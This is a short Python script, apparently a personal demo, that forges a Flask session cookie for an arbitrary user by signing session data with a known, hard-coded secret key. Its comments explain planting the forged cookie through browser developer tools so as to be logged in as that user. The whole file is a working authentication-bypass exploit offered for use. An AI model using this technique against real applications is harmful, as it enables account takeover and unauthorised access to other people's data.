from flask.sessions import SecureCookieSessionInterface
from flask import *

# I was bored one afternoon so I wrote this demo script to exploit the webapp
# essentially, since we know the secret key, we can generate a cookie that corresponds to any given user with that secret key
# then we just stick the forged secret key into the cookie data using developer tools and you're logged in (with 'session' as the cookie name)

# inspired by this medium article https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce
# used documentation from this StackOverflow post to implement the exploit https://stackoverflow.com/questions/42283778/generating-signed-session-cookie-value-used-in-flask

app = Flask(__name__)
app.secret_key = "LInPyX4PpZx6hAHofg=="
session_data = {"username": "maxtalwar"}

serializer = SecureCookieSessionInterface().get_signing_serializer(app)

cookie_payload = serializer.dumps(session_data)
print("Forced session cookie:", cookie_payload)
